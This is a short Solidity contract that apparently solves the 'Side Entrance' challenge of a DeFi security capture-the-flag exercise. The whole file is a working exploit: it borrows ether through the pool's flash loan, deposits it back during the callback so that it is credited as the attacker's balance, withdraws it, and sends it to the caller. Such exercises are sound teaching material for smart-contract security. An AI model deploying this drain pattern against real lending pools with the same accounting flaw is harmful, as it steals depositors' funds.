// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

import "hardhat/console.sol";

contract SideEntranceAttacker {
    function attack(address pool, uint256 amount) external {
        SideEntranceLenderPool(pool).flashLoan(amount);

        SideEntranceLenderPool(pool).withdraw();

        payable(msg.sender).transfer(amount);
    }

    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    receive() external payable {}
}
